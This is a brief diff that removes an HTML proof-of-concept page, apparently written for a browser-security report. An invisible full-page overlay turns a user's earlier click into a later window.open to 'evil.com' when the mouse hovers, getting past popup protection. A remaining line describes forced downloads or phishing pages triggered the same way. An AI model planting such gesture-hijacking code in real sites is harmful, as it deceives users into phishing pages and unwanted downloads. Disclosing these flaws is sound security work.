@@ -1,29 +1,4 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <p>Click anywhere. Then move your mouse slowly across the page — a popup appears without any further action.</p>
-<h1>High-Impact PoC: Hidden click + hover-triggered popup</h1>
-    <div id="trap" style="width:100vw; height:100vh; position:absolute; top:0; left:0;">
-      <div id="trigger" style="position:absolute; top:40%; left:40%; width:200px; height:150px; background:transparent;"></div>
-    </div>
 
-    <script>
-      let gestureArmed = false;
-
-      document.body.addEventListener('click', () => {
-        gestureArmed = true;
-      });
-
-      document.getElementById('trigger').addEventListener('mouseenter', () => {
-        if (gestureArmed) {
-          window.open('https://evil.com', '_blank');
-          gestureArmed = false;
-        }
-      });
-    </script>
-  </body>
-</html>
-<!DOCTYPE html>
 <html>
   <body>
     <p>Click anywhere, then hover over the invisible area to trigger a **forced PDF download** or a **phishing page** without any additional confirmation.</p>
